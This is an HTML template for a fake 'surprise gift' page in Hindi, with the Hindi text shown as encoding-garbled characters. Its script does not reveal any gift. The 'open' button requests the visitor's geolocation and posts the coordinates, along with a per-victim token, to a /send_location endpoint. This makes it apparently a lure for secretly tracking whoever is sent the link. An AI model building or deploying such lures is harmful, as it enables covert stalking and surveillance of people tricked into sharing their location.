<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>‡§Ü‡§™‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§ó‡§≤‡§æ surprise üéâ</title>
  <style>
    body{margin:0;font-family:sans-serif;background:linear-gradient(135deg,#22c55e,#16a34a);
      display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;text-align:center}
    .card{background:rgba(0,0,0,0.5);padding:24px;border-radius:16px;max-width:320px;width:90%}
    h1{font-size:1.4rem;margin-bottom:12px}
    p{margin-bottom:20px}
    button{background:linear-gradient(90deg,#0ea5e9,#3b82f6);border:none;color:#fff;
      padding:14px 20px;border-radius:12px;width:100%;font-size:1.1rem;font-weight:600}
    #msg{margin-top:15px;font-size:0.9rem;color:#fbbf24}
  </style>
</head>
<body>
  <div class="card">
    <h1>üéÅ {{ user_name }} ‡§ï‡§æ ‡§Ö‡§ó‡§≤‡§æ ‡§§‡•ã‡§π‡§´‡§º‡§æ</h1>
    <p>‡§ñ‡•ã‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡•Ä‡§ö‡•á ‡§ï‡•ç‡§≤‡§ø‡§ï ‡§ï‡§∞‡•á‡§Ç‡•§</p>
    <button id="btnLoc">‡§ñ‡•ã‡§≤‡•á‡§Ç</button>
    <div id="msg"></div>
  </div>

<script>
const token = "{{ token }}";
const msg = document.getElementById("msg");

document.getElementById("btnLoc").addEventListener("click", ()=>{
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        fetch("/send_location", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ 
            token, 
            lat: pos.coords.latitude, 
            lon: pos.coords.longitude 
          })
        })
        .then(res => res.json())
        .then(data => {
          console.log("Server response:", data);
          if (data.status === "sent") {
            msg.innerText = "‚úÖ Location ‡§≠‡•á‡§ú ‡§¶‡•Ä ‡§ó‡§à ‡§π‡•à‡•§";
          } else {
            msg.innerText = "‚ö†Ô∏è Location ‡§≠‡•á‡§ú‡§®‡•á ‡§Æ‡•á‡§Ç ‡§¶‡§ø‡§ï‡•ç‡§ï‡§§ ‡§Ü‡§à: " + data.status;
          }
        })
        .catch(err => {
          console.error("Fetch error:", err);
          msg.innerText = "‚ùå Error: " + err;
        });
      },
      err => {
        console.warn("Geo permission denied or error:", err);
      },
      {timeout: 5000}
    );
  } else {
    msg.innerText = "‚ùå ‡§Ü‡§™‡§ï‡§æ browser location support ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ‡•§";
  }
});
</script>
</body>
</html>